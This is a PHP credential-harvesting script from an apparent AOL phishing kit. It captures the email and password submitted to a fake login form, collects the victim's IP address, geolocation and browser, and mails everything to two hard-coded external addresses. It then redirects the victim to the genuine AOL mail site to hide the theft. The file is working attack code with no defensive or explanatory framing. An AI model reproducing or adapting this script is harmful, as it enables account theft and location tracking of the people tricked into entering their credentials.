<?
require_once('geoplugin.class.php');


$geoplugin = new geoPlugin();

$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    
$ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    
$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    
$ip = $_SERVER['REMOTE_ADDR']; 
} 
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "---A0L Logx-----\n"; 
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";  
$message .= "--------IP and Browser--------\n"; 
$message .= "IP Address: ".$ip."\n";

$message .= "City: {$geoplugin->city}\n";

$message .= "Region: {$geoplugin->region}\n";

$message .= "Country Name: {$geoplugin->countryName}\n";

$message .= "Country Code: {$geoplugin->countryCode}\n";

$message .= "Browser: ".$browser."\n";
$message .= "-----------++++++++-----------\n"; 
$recipient = "henrysmith2391@yandex.com, gratefulsoul@outlook.com"; 
$subject = "A0Logx+++ $ip"; 
$headers = "From: SP <all@wi-ollc.xyz>\r\n"; 
$Headers .= "MIME-Version: 1.0\r\n";
$headers .= $_POST['SP <all@wi-ollc.xyz>']."\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
if (mail($recipient,$subject,$message,$headers)) { header("Location: https://mail.aol.com/"); } ?>